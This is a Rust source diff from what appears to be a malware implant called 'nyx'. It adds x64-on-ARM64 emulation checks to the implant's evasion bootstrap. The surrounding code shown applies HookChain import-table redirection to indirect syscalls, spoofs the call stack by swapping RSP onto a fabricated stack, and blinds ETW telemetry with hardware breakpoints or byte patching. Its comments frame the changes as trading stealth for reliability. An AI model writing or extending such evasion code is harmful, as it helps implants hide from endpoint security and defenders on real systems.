@@ -130,7 +130,18 @@ unsafe fn bootstrap_syscalls(ntdll: &LiveNtdll) {
 
 /// HookChain install.
 unsafe fn bootstrap_hookchain() {
-    // HookChain
+    // x64-on-ARM64 emulation (Prism): HookChain's redirected IAT slots point
+    // at indirect-syscall stubs whose `jmp gadget` is FATAL under the
+    // emulator (0xC000026F — the same mechanism documented on
+    // `syscalls::Runtime::direct`). The first Win32 call that routes through
+    // a redirected import kills the process (observed 2026-08-13 on Parallels
+    // Win11 ARM64: nyx_entry died with 0xC000026F right after L0_loop_start,
+    // all bootstrap markers written). Skip entirely under emulation — the
+    // same noevasion-degrade convention as the syscall runtime.
+    if crate::syscalls::is_x64_emulated_on_arm64() {
+        diag_mark(b"3_hookchain_emu_skip");
+        return;
+    }
     let _hookchain_count = unsafe { crate::hookchain::apply() };
     diag_mark(b"3_hookchain");
 }
@@ -167,9 +178,15 @@ fn bootstrap_pdata_gaps() {
             Some(v) => v.len() == 1 && v.as_bytes()[0] == b'1',
             None => false,
         };
+        // x64-on-ARM64 emulation (Prism): the RSP swap runs syscalls on a
+        // fabricated stack while the emulator's CONTEXT tracking of x64
+        // threads is unreliable (x64dbg#2923-class bugs); keep the swap inert
+        // there (function over stealth, same degrade convention).
+        let emulated = crate::syscalls::is_x64_emulated_on_arm64();
         let cet_on = crate::version::cet_active();
         let gaps_usable = leaked.is_usable();
         if !spoof_disabled
+            && !emulated
             && matches!(
                 nyx_implant_evasionsdk::swap::decide(cet_on, gaps_usable),
                 nyx_implant_evasionsdk::swap::SwapDecision::Execute
@@ -200,7 +217,14 @@ fn bootstrap_countermeasures() {
 unsafe fn bootstrap_blind() {
     // BLIND: HWBP → byte-patch fallback
     let mut hwbp_ok = false;
-    if unsafe { crate::blind_hwbp::init_shadow_buffer() } {
+    // x64-on-ARM64 emulation (Prism): hardware breakpoints are not delivered
+    // to emulated x64 processes (WoA WoW64 debug-register gap —
+    // llvm/llvm-project#80665), so the DR-arm + single-step VEH flow cannot
+    // work there. Skip straight to the byte-patch fallback: pure memory
+    // writes, safe under emulation. Native x64 behavior unchanged.
+    if !crate::syscalls::is_x64_emulated_on_arm64()
+        && unsafe { crate::blind_hwbp::init_shadow_buffer() }
+    {
         diag_mark(b"5a_hwbp_init");
         let etw_slot = unsafe { crate::blind_hwbp::blind_etw_hwbp() };
         diag_mark(b"5b_hwbp_etw");
